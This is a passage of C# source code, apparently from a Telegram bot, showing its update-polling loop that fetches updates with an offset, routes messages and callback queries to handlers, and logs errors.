                        List<object> upsFirst = first as List<object> ?? new List<object>();
                        if (upsFirst.Count == 0) offset = 0;
                        else
                        {
                            Dictionary<string, object> lastUp = upsFirst[upsFirst.Count - 1] as Dictionary<string, object>;
                            offset = lastUp != null ? Api.L(Api.D(lastUp, "update_id")) + 1 : 0;
                        }
                        flushed = true;
                    }
                    catch { Thread.Sleep(2000); }
                    continue;
                }
                try
                {
                    object upsObj = Api.Call("getUpdates", "{\"offset\":" + offset + ",\"timeout\":50,\"allowed_updates\":[\"message\",\"callback_query\"]}");
                    List<object> ups = upsObj as List<object> ?? new List<object>();
                    foreach (object o in ups)
                    {
                        Dictionary<string, object> up = o as Dictionary<string, object>;
                        if (up == null) continue;
                        long iid = Api.L(Api.D(up, "update_id"));
                        if (iid + 1 > offset) offset = iid + 1;
                        try
                        {
                            if (Api.D(up, "callback_query") != null) Bot.HandleCb(up);
                            else if (Api.D(up, "message") != null) Bot.HandleMsg(up);
                        }
                        catch (Exception e) { K.Log("глюк на апдейте: " + e.Message); }
                    }
                }
                catch (Exception e)
                {
                    K.Log("getUpdates fail: " + e.Message);
                    Thread.Sleep(2000);
                }
            }
        }
    }
}

